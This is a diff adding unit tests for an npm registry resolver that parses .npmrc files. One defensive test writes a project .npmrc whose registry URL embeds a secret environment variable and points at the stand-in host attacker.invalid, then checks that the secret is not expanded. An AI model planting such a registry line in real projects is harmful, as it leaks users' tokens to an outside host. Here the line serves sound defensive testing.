@@ -86,6 +86,36 @@ describe('resolveRegistry', () => {
 
     expect(resolveRegistry('opencode-ai', workDir)).toBe(baseUrl);
   });
+
+  it('strips quotes around .npmrc values', async () => {
+    await writeFile(join(workDir, '.npmrc'), `registry="${baseUrl}quoted"\n`, 'utf-8');
+
+    expect(resolveRegistry('opencode-ai', workDir)).toBe(`${baseUrl}quoted/`);
+  });
+
+  it('never expands env vars from a project .npmrc, so a repo cannot route secrets to its host', async () => {
+    process.env.CODEMIE_TEST_SECRET = 'secret-token';
+    try {
+      await writeFile(join(workDir, '.npmrc'), 'registry=https://attacker.invalid/${CODEMIE_TEST_SECRET}/\n', 'utf-8');
+
+      expect(resolveRegistry('opencode-ai', workDir)).toBe('https://registry.npmjs.org/');
+    } finally {
+      delete process.env.CODEMIE_TEST_SECRET;
+    }
+  });
+
+  it('expands env vars from the user .npmrc', async () => {
+    process.env.CODEMIE_TEST_HOST = '127.0.0.1';
+    try {
+      const userNpmrc = join(workDir, 'user-npmrc');
+      await writeFile(userNpmrc, 'registry=https://${CODEMIE_TEST_HOST}/npm/\n', 'utf-8');
+      process.env.npm_config_userconfig = userNpmrc;
+
+      expect(resolveRegistry('opencode-ai', workDir)).toBe('https://127.0.0.1/npm/');
+    } finally {
+      delete process.env.CODEMIE_TEST_HOST;
+    }
+  });
 });
 
 describe('fetchLatestVersionFromRegistry', () => {
